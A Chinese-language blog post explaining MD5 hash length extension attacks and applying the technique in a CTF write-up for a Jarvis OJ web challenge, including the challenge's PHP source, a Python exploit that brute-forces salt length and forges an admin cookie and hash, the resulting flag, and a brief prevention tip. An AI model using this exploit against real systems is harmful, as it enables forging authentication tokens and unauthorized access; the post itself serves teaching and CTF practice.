---
title: hash长度扩展攻击
copyright: true
date: 2018-08-13 19:29:04
tags: [密码学]
categories: 密码安全
---
# 简介
`hash长度扩展攻击`主要指对类似MD5算法的hash算法攻击。当一个程序有类似`if(input1 == md5(salt+input2)){}`的逻辑并且能获得一次`md5(salt+input2)`的hash值的时候，那么这个程序就容易受到`hash长度扩展攻击`。
# 分析原理
这种针对哈希算法的攻击当然与算法有关。这里通过MD5算法来分析这种攻击方式。
## MD5算法
MD5是一种消息摘要算法，它的计算过程不可逆。它主要通过以下步骤来计算最后的hash值：
1. 填充。计算传入的消息文本`text`的长度（单位：bits），看它除以512的余数是否为448。等于则将填充前的长度（单位：bits）填充到消息文本的末端（占64bits）。否则，填充二进制1到消息文本末端，之后填充二进制0直到最后消息的长度除以512的余数为448，再将填充前的长度（单位：bits）填充到消息文本的末端（占64bits）。
2. 分组。由于第一步的填充消息的长度必为512的整数倍，将填充完毕的消息按每组512bits分组。
3. 分组计算。将`A=0x67452301,B=0xefcdab89,C=0x98badcfe,D=0x10325476`作为第一组的链变量，并且每一组进行64步轮换计算，每组计算完成后得到`a,b,c,d`四个32位的整数，将这四个整数分别加上该组的链变量作为下一组的链变量使用。当所有组计算完毕，得到最后的链变量。将链变量级联起来作为最后的结果。
这些就是MD5算法的计算步骤，关于`轮换计算`的算法有点复杂就不写了，网上有。

## 攻击分析
分析MD5算法的第三步可以发现，每组消息的计算结果取决于该组的链变量和该组的消息内容，如果知道了最后一组的链变量和消息内容那么不需要知道前面几组到底是什么就可以计算出最后的消息摘要。这对于类似有`if(input1 == md5(salt+input2)){}`代码逻辑的程序来说是可能绕过盐值而达到判断成立的。因为，我们可以通过在原消息的基础上，扩展一个消息分组出来，然后利用最后一个扩展的消息分组的内容可控性，和原消息的hash值（这能计算出最后一个分组的链变量）来重演最后一个分组的计算过程，进而得到最后的hash值。
# 举个例子
下面举一个例子来说明`hash长度扩展攻击`的利用场景。
这是一道`jarvis oj`平台上的CTF题目`flag在管理员手里`，在web板块。
题目可以读取备份文件`index.php~`
```php
<!DOCTYPE html>
<html>
<head>
<title>Web 350</title>
<style type="text/css">
	body {
		background:gray;
		text-align:center;
	}
</style>
</head>

<body>
	<?php 
		$auth = false;
		$role = "guest";
		$salt = 
		if (isset($_COOKIE["role"])) {
			$role = unserialize($_COOKIE["role"]);
			$hsh = $_COOKIE["hsh"];
			if ($role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))) {
				$auth = true;
			} else {
				$auth = false;
			}
		} else {
			$s = serialize($role);
			setcookie('role',$s);
			$hsh = md5($salt.strrev($s));
			setcookie('hsh',$hsh);
		}
		if ($auth) {
			echo "<h3>Welcome Admin. Your flag is 
		} else {
			echo "<h3>Only Admin can see the flag!!</h3>";
		}
	?>
	
</body>
</html>
```
读源码可以发现，只有当`$_COOKIE["role"]`的反序列化值为`admin`并且`$hsh === md5($salt.strrev($_COOKIE["role"]))`成立才能getflag。这和hash长度扩展攻击的利用场景一致，因为我们能够控制最后一个消息分组的内容，而且程序会在`$_COOKIE["role"]`未定义的时候把一段hash值返回给我们，这样我们能够通过该hash值反计算到最后一个分组的链变量，即最后一个消息分组的内容和链变量都知道了，那么即使不知道盐值也可计算最后的hash值。
需要注意的是，我们传入程序的是两个输入，一个作为消息主体传入另一个作为最后的hash值传入。虽然hash值能准确计算，但是消息主体却是不确定的，因为我们无法得知`salt`的长度，我们就无法计算前一个消息分组究竟要怎么填充，也就无法得到准确的消息主体了。所以这一题需要爆破`salt`的长度。下面是exp
```python
#coding=utf8
from myhash import *
import requests
import urllib

url = "http://web.jarvisoj.com:32778/"
tmp_hsh = "3a4727d57463f122833d9e732f94e4e0"
#爆破
for i in xrange(1,20):
    p = 's:5:"admin";'[::-1]
    poc = 's:5:"guest";'
    poc = md5_fill('x'*i+poc[::-1]).lstrip('x'*i)+p
    poc = poc[::-1]
    poc = urllib.quote(poc)
    tmp = hash_split(tmp_hsh)
    m = MD5(p,*tmp)
    s = m.md5(512+len(p)*8)
    headers = {"Cookie":"role={};hsh={}".format(poc,s)}
    r = requests.get(url,headers=headers)
    if r.text.find("Only Admin") == -1:
        print r.text
        print i
        break
    else:
        print 'No.'
```
结果
```
> python poc.py
No.
No.
No.
No.
No.
No.
No.
No.
No.
No.
No.
<!DOCTYPE html>
<html>
<head>
<title>Web 350</title>
<style type="text/css">
        body {
                background:gray;
                text-align:center;
        }
</style>
</head>

<body>
        <h3>Welcome Admin. Your flag is PCTF{H45h_ext3ndeR_i5_easy_to_us3} </h3>
</body>
</html>

12

```
这里的`myhash`是我自己写的`MD5`算法，便于扩展攻击。可以在我的[github](https://github.com/r00tnb/pylibs)上找到。
# 预防
使用`md5(salt+hash(input))`的方式来使消息主体不可控。